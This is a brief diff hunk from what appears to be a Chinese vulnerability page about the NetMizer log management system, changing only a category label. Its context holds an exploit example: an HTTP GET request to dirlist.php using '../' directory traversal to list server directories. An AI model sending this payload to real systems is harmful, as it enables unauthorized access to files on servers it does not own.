@@ -104,7 +104,7 @@ NetMizer日志[管理系统](#)是一款用于网络流量管理和优化的日�
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-计算机科学
+工程与技术
 
 ```
 GET /data/manage/dirlist.php?node=/home/lingzhou/NMLog/../../../ HTTP/1.1
